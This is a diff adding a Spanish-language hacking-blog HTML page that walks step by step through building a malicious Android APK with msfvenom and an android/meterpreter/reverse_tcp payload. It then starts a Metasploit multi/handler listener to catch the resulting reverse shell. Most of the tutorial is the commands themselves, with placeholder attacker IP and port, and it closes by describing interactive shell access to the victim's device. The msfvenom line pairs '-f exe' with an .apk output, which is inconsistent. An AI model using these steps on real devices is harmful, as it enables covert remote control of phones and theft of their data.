@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Como crear una apk maliciosa para android</title>
+    <link rel="stylesheet" href="css/como-crear-una-apk-maliciosa-para-android.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body>
+    
+    <!--Navbar init-->
+    <nav class="navbar navbar-expand-lg">
+        <div class="container-fluid">
+          <a class="navbar-brand text-light" href="index.html">HackerCloud</a>
+          <button class="navbar-toggler bg-light" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+          </button>
+          <div class="collapse navbar-collapse" id="navbarSupportedContent">
+            <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+              <li class="nav-item">
+                <a class="nav-link active text-light text-center" aria-current="page" href="index.html">Home</a>
+              </li>
+              <li class="nav-item">
+                <a class="nav-link text-light text-center" href="contacto.html">Contact</a>
+              </li>
+              <li class="nav-item dropdown">
+                <a class="nav-link dropdown-toggle text-light text-center" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+                  Social Networks
+                </a>
+                <ul class="dropdown-menu bg-dark" aria-labelledby="navbarDropdown">
+                  <li><a class="dropdown-item text-light text-center" href="https://tryhackme.com/p/HackerCloudweb">TryHackMe</a></li>
+                  <li><a class="dropdown-item text-light text-center" href="https://github.com/HackerCloudweb">Github</a></li>
+                  <li><hr class="dropdown-divider bg-light"></li>
+                  <li><a class="dropdown-item text-light text-center" href="mailto:anonimous123321123@protonmail.com?">Email</a></li>
+                </ul>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </nav>
+      <!--Navbar end-->
+
+      <!--Main init-->
+            <div class="container">
+                <h1 class="h1 text-info" style="margin-top: 20px;">Cómo crear una apk maliciosa para android con metasploit</h1>
+                <h5 class="h5 text-light" style="margin-top: 40px;"> 
+                    En este artículo aprenderemos a crear una aplicación maliciosa para android con metasploit. <br> <br>
+                    Para empezar quiero aclarar que no soy responsable de el uso que le vayáis a dar a esta aplicación y que no recomiendo
+                    que uséis demasiado metasploit ya que os vais a acostumbrar a que os lo den todo hecho y la gracia es que sepáis lo quiero
+                    estáis ejecutando y además el OSCP no permite el uso de esta herramienta y el resto de herramientas de botón gordo. <br> <br>
+                </h5>
+                <h4 class="h4 text-success" style="margin-top: 50px;">1-Crear la aplicación con msfvenom.</h4>
+                <h5 class="h5 text-light" style="margin-top: 30px;">
+                    Para hacerlo ejecutaremos el siguiente comando: <br> <br> <b class="b bg-secondary rounded"> msfvenom -p android/meterpreter/reverse_tcp -f exe lhost=TU_IP lport=Listen_PORT -o nombre_final.apk</b> <br> <br>
+                    Recordad que tenéis que cambiar el LHOST y el LPORT por el vuestro, por defecto el LPORT de metasploit es 4444 per podéis usar el que queráis.<br> <br>
+                    Después de hacer esto en el directorio en el que ejecutastéis el comando se creará el archivo con el nombre indicado anteriormente.
+                </h5>
+                <h4 class="h4 text-success" style="margin-top: 50px;">2-Iniciar la consola de metasploit.</h4>
+                <h5 class="h5 text-light" style="margin-top: 30px;">
+                    Para inicar la consola tenemos que ejecutar el siguiente comando: <b class="b bg-secondary rounded">msfconsole -q</b>
+                </h5>
+                <h4 class="h4 text-success" style="margin-top: 50px;">3-Setear el exploit que vamos a usar.</h4>
+                <h5 class="h5 text-light" style="margin-top: 30px;">
+                Para setear el exploit hay que ejecutar el siguiente comando: <b class="b bg-secondary rounded">use exploit/multi/handler</b></h5>
+                <h4 class="h4 text-success" style="margin-top: 50px;">4-Setear el payload que vamos a usar.</h4>
+                <h5 class="h5 text-light" style="margin-top: 30px;">
+                Para setear el payload hay que ejecutar el siguiente comando: <b class="b bg-secondary rounded">set payload android/meterpreter/reverse_tcp</b></h5>
+                <h4 class="h4 text-success" style="margin-top: 50px;">5-rellenar las opciones necesarias.</h4>
+                <h5 class="h5 text-light" style="margin-top: 30px;">
+                Para ello debemos ejecutar los siguientes comandos: <b class="b bg-secondary rounded">set lhost=TU_IP </b> y <b class="b bg-secondary rounded"> set lport Listen_PORT</b> <br><br>
+                Recordad que tenéis que poner la misma IP y el mismo puerto para que funcione el listener.
+                </h5>
+                <h4 class="h4 text-success" style="margin-top: 50px;">6-Iniciar el exploit y el listener.</h4>
+                <h5 class="h5 text-light" style="margin-top: 30px;">
+                Para iniciar el exploit tenéis que ejecutar el siguiente comando: <b class="b bg-secondary rounded">exploit </b> o <b class="b bg-secondary rounded"> run</b><br><br>
+                Para el listener podéis usar el listener que se ejecuta por defecto con el exploit o hacer un con netcat u otro programa.
+                </h5><br><br>
+                <h5 class="h5 text-light">
+                    Y con eso obtenéis una reverse shell, podéis ejecutar el comando help para mostrar los payloads que vienen con metasploit
+                    o ejecutar el comando shell para obtener una shell interactiva.
+                </h5> <br><br>
+            </div>
+
+            <!--
+                <h4 class="h4 text-success" style="margin-top: 50px;">1-Step</h4>
+                <h5 class="h5 text-light" style="margin-top: 30px;">
+                Explanation: <b class="b bg-secondary rounded">Command</b></h5>
+            -->
+
+      <!--Main end-->
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
